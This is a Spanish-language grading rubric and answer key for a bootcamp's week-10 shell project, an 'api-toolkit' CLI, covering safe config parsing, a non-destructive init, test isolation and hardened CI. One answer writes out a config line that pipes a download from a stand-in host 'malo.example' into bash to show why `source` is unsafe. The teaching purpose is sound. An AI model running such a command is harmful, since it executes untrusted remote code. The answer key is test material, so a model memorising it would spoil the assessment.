# Rúbrica de evaluación — Semana 10

> Proyecto final. Se evalúa que el toolkit lo pueda usar otra persona: que
> se configure sin editar el código y sin ejecutar su configuración, que
> `init` no destruya nada, que se instale y se quite limpiamente, que sus
> tests digan la verdad en cualquier máquina, y que una CI con los permisos
> justos los ejecute con el curl más antiguo que el bootcamp soporta.

---

## 📊 Distribución de Evidencias

| Evidencia | Peso | Instrumento |
|---|:--:|---|
| 🧠 Conocimiento | 30% | 10 preguntas conceptuales |
| 💪 Desempeño | 40% | Las 4 prácticas, con sus entregables y salida real de tu máquina |
| 📦 Producto | 30% | El starter y tu repositorio: 60 pts de autograding + 40 pts de calidad |

**Mínimo 70% en cada evidencia**, no en el promedio. Una suite en verde no
compensa no saber por qué podría estar en verde sin probar nada.

---

## 🧠 Conocimiento (30%)

| # | Pregunta |
|:--:|---|
| 1 | Nombra los cinco canales de la interfaz de una CLI. Para cada uno, da un cambio en `api-toolkit` que rompería a alguien que ya lo usa, y di a quién. ¿Qué versión tendría que salir después de ese cambio, según semver? |
| 2 | El toolkit tiene 1400 líneas en un archivo. Un compañero propone partirlo en `bin/api-toolkit` y `lib/*.sh`. Da dos costes concretos de hacerlo y una situación en la que sí compensaría. |
| 3 | Hasta la capa 9, poner `BASE_URL=https://api.github.com` en `~/.bc-curl` no tenía ningún efecto. ¿Por qué? ¿Qué cambia la capa 10 para que el archivo cuente, y por qué los valores por defecto van donde van? |
| 4 | `source ~/.bc-curl` leería la configuración en una línea. Da dos líneas que podrían estar en ese archivo y lo que haría cada una con `source`. ¿Cómo lo lee el toolkit, y qué hace `CLAVES_ARCHIVO` que no hace la lectura con `read`? |
| 5 | Un `init` hace `[ -e ~/.bc-curl ] \|\| echo "BASE_URL=$BASE_URL" > ~/.bc-curl; chmod 600 ~/.bc-curl`. Señala sus dos fallos con dos procesos o con mala suerte, y explica cómo los cierran `noclobber` y `umask 077`. ¿Por qué todo eso va dentro de un subshell? |
| 6 | ¿Por qué el `init` del toolkit no escribe un `API_TOKEN` que encuentre en el entorno, no pregunta nada y no tiene `--force`? Una razón para cada una. |
| 7 | Tu suite pasa en tu máquina y falla en la de un compañero, sin cambiar el código. Da dos causas posibles relacionadas con el entorno y cómo las elimina el `setup` del starter. ¿Por qué `teardown` borra `$DIR` y no `$HOME`? |
| 8 | Con `TK=/bin/true bats tests/`, un test sigue en verde. ¿Qué te dice eso del test? En el mismo archivo, un test termina en `! grep -q secreto archivo` y otro tiene esa línea en medio: ¿cuál de los dos detecta el secreto y por qué? |
| 9 | `install.sh` usa `install -m 755` y no `cp`, busca el origen al lado de sí mismo, y `uninstall` borra un solo archivo. Explica cada decisión. Tras desinstalar, `command -v api-toolkit` aún da la ruta: ¿por qué? Y, ¿qué tiene de malo instalar con `curl URL \| bash`? |
| 10 | El workflow corre en contenedores `ubuntu:22.04` y `ubuntu:24.04` en vez de en el runner `ubuntu-22.04`, fija `actions/checkout` por SHA y declara `permissions: contents: read`. ¿Qué riesgo o problema evita cada una de las tres cosas? ¿Por qué no hay laboratorio en la CI, y dónde se prueba lo que necesita red? |

<details>
<summary><strong>Respuestas</strong></summary>

**1.** Argumentos, entorno y archivo de configuración, stdout, stderr y
código de salida. Ejemplos: renombrar `fetch-all` rompe a quien lo invoca;
dejar de leer `API_CACERT` rompe a quien la configuró; imprimir un
"Conectando..." por stdout rompe el `| jq` de detrás; mover los errores a
stdout los mete en los datos; cambiar el 75 por un 1 rompe el cron que
reintentaba. Todos rompen la interfaz: piden `2.0.0`.

**2.** Costes: el instalador tiene que copiar un árbol y el principal tiene
que encontrar sus librerías (`readlink -f`, que no existe en el macOS
antiguo); shellcheck necesita directivas para seguir los `source`; cada
cambio toca más archivos. Compensa cuando dos programas comparten código, o
cuando varias personas editan el mismo archivo a la vez.

**3.** `BASE_URL` recibía su valor por defecto en la primera línea, así que
nunca estaba vacía, y el archivo solo daba credenciales. La capa 10 deja
vacías arriba las variables que pueden venir del archivo, las lee en un
bucle que solo asigna si siguen vacías (el entorno manda), y pone los
valores por defecto al final de `cargar_configuracion`, después del archivo.

**4.** `API_KEY=$(curl -s https://malo.example/x | bash)` descargaría y
ejecutaría un programa; `PATH=/opt/algo` cambiaría qué `curl` se ejecuta.
El toolkit lee con `grep -E '^[A-Z_]+='` y `while IFS='=' read -r clave
valor`: `$(...)` se queda como texto. `CLAVES_ARCHIVO` limita qué claves se
aceptan: sin la lista, `PATH=/nada` se leería sin ejecutarse, pero se
asignaría igual, con el mismo efecto.

**5.** Entre el `[ -e ]` y el `>` otro proceso puede crear el archivo, y el
`>` lo trunca; entre el `>` y el `chmod`, el archivo existe con 644.
`noclobber` hace que `>` abra con `O_EXCL`: crea o falla, en un solo paso.
`umask 077` hace que nazca con 600, sin ventana. En un subshell porque las
dos cosas cambian el shell entero: fuera, todos los archivos que el toolkit
creara después (un `download`) nacerían con 600, y los `>` posteriores
fallarían.

**6.** No escribe el token porque eso enseña a ejecutar
`API_TOKEN=... api-toolkit init`, que lo deja en el historial; los secretos
entran con el editor. No pregunta para poder usarse desde un script, la CI o
bats: se configura por entorno. No tiene `--force` porque borrar un archivo
con secretos tiene que ser una decisión explícita con `rm`.

**7.** Un `~/.bc-curl` del compañero (con otra URL, o con 644, que el
toolkit rechaza) y variables exportadas (`BASE_URL`, `AUTH_MODE`). `setup`
exporta `HOME` a un directorio vacío y hace `unset` de todas las variables
del toolkit. `teardown` borra `$DIR` porque si `setup` fallara antes del
`export`, `$HOME` seguiría siendo el HOME real.

**8.** Que solo comprueba `$status`, o solo la ausencia de algo: `/bin/true`
sale con 0 y no imprime nada. Detecta el secreto el que termina en
`! grep`: es el código de retorno del test. En medio, bash no aplica
`set -e` a un comando negado, y el test sigue aunque el `grep` encuentre el
secreto. La forma segura es `run grep -c` y comprobar `$output`.

**9.** `install -m 755` fija los permisos (con `cp` se heredan) y sustituye
el archivo por uno nuevo en lugar de escribir dentro. El origen se busca al
lado del instalador para que funcione desde cualquier carpeta. `uninstall`
borra solo el ejecutable porque `~/.bc-curl` y la sesión son del usuario.
`command -v` da la ruta porque bash la recordó al ejecutarlo: `hash -r`.
`curl | bash` ejecuta lo que el servidor mande en ese momento, sin leerlo ni
verificarlo, y lo que llegue a medias si se corta.

**10.** El contenedor fija la versión de curl y de bats, y no depende de un
runner que GitHub retira (los de Ubuntu 22 dejan de existir el 17 de abril
de 2027). El SHA no se puede mover; una etiqueta sí, y su código se ejecuta
con acceso al repositorio. `contents: read` impide que un paso comprometido
escriba en el repositorio con el token. No hay laboratorio porque habría que
llevar el compose y la CA al repositorio del toolkit; los tests de red se
saltan con `skip` y se prueban en local con `bats` y `verificar-semana.sh`.

</details>

---

## 💪 Desempeño (40%)

| Práctica | Criterio | Puntos |
|---|---|:--:|
| 01 — Configuración e `init` | `configuracion.md` con el archivo ignorado por la capa 9, el `touch` ejecutado por `source`, la precedencia funcionando con el 644 rechazado, `PATH=/nada` ignorado, el archivo de `init` con 600 y sin el token, y los números de la carrera de ocho `init` explicados | 10 |
| 02 — Tests con bats | `tests.md` con un `not ok` leído hasta su línea, los tres tests que fallaban con otro HOME y por qué, la suite pasando tras el TODO 3, el test que pasaba con `/bin/true` y cómo se arregló, y la mutación de la umask en rojo | 10 |
| 03 — Instalar y documentar | `instalacion.md` con la instalación temporal y la real, `cp` frente a `install`, la desinstalación con `hash -r` explicado; y el repositorio con `README.md` de siete secciones, `CHANGELOG.md` y la etiqueta `v1.0.0` | 10 |
| 04 — Integración continua | `ci.md` con el SHA comprobado con `git ls-remote`, el check roto con `@v6`, y la URL del repositorio con un run en verde en las dos imágenes, la marca en el `README` y la etiqueta sobre el commit que pasó la CI | 10 |

---

## 📦 Producto (30%)

### Verificable por el autograding — 60 puntos

| Comprobación | Puntos |
|---|:--:|
| `bats-instalado` | 1 |
| `toolkit-ejecutable` | 2 |
| `toolkit-sin-todos` | 2 |
| `toolkit-version` | 2 |
| `toolkit-get-sigue` | 2 |
| `ayuda-completa` | 3 |
| `init-crea-600` | 5 |
| `init-no-pisa` | 4 |
| `config-del-archivo` | 4 |
| `config-entorno-manda` | 3 |
| `config-no-ejecuta` | 5 |
| `instalar` | 4 |
| `tests-cuentan` | 3 |
| `tests-pasan` | 3 |
| `tests-aislados` | 5 |
| `tests-detectan-fallos` | 4 |
| `ci-workflow` | 5 |
| `toolkit-shellcheck` | 3 |
| **Total** | **60** |

### Calidad — 40 puntos

| Criterio | Qué se mira | Puntos |
|---|---|:--:|
| Configuración segura | Ningún `source` ni `eval`; solo claves de `CLAVES_ARCHIVO`; `${!clave}` y `printf -v`; valores por defecto en un sitio, después del archivo; el 600 sigue exigido | 8 |
| `init` correcto | `umask 077` y `noclobber` en un subshell; mensaje claro si existe, y código 1; saltos de línea rechazados; los secretos comentados y vacíos; sin `--force` | 7 |
| Instalador | Origen al lado del script; `install -d` y `install -m 755`, portable a macOS; comprueba que arranca; avisa del PATH sin tocar el `~/.bashrc`; `uninstall` solo borra el ejecutable | 6 |
| Tests creíbles | Nombres descriptivos; aserciones sobre la salida, no solo sobre el código; valores que solo pueden venir de donde se dice; ningún `!` en medio; `teardown` sobre `$DIR`; los de red con `skip` | 8 |
| CI | `permissions: contents: read`; acciones por SHA con su versión en comentario; `persist-credentials: false`; `timeout-minutes`; dos imágenes con etiqueta completa; un paso que imprime las versiones | 6 |
| Documentación | `--help` completo y verdadero; `README` con las siete secciones y sin copiar `--help`; `CHANGELOG` escrito para quien usa; etiqueta `v1.0.0` anotada | 5 |
| **Total** | | **40** |

### Penalizaciones

| Situación | Deducción |
|---|:--:|
| Un secreto en el repositorio entregado: en el código, en un `.env`, en el workflow o en el historial de git | **−30** y hay que rotarlo ya |
| Un `-k` o `--insecure` en la entrega | **−20** |
| El archivo de configuración se lee con `source` o `eval` | **−15** |
| `init` puede pisar un archivo existente, o lo crea con permisos abiertos aunque sea un instante | −10 |
| Un test escribe en el HOME real de quien lo ejecuta | −10 |
| Un test llama a una API real (la de tu dominio, GitHub...) | −8 |
| Una acción fijada por etiqueta o rama, o un workflow sin `permissions` | −8 |
| Un instalador con `curl \| bash`, o un `uninstall` que borra la configuración | −8 |
| `shellcheck -S warning` con avisos | −5 |

Las tres primeras no son puntos: son la diferencia entre entregar una
herramienta y entregar un riesgo. Una versión `1.0.0` es una promesa a otra
persona, y lo primero que promete es no hacerle daño.

---

[← README de la Semana 10](README.md)
